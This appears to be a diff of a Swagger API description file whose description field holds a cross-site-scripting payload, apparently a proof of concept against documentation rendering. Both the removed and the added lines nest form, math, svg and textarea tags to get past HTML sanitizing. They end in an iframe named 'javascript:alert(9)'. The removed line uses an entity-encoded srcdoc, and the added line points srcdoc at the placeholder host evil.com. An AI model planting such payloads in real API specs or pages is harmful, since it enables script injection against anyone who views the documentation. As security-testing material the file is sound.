@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe srcdoc='&#x3c;&#x64;&#x69;&#x76;&#x20;&#x64;&#x61;&#x74;&#x61;&#x2d;&#x62;&#x69;&#x6e;&#x64;&#x3d;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3a;&#x61;&#x3d;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x3c;&#x64;&#x69;&#x76;&#x20;&#x64;&#x61;&#x74;&#x61;&#x2d;&#x62;&#x69;&#x6e;&#x64;&#x3d;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3a;&#x61;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x3d;&#x6e;&#x61;&#x6d;&#x65;&#x3e;' name='javascript:alert(9)'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe srcdoc='http://evil.com' width=100% heigth=1000px name='javascript:alert(9)'>"></form>
 
   version: production
 basePath: /JSSResource/
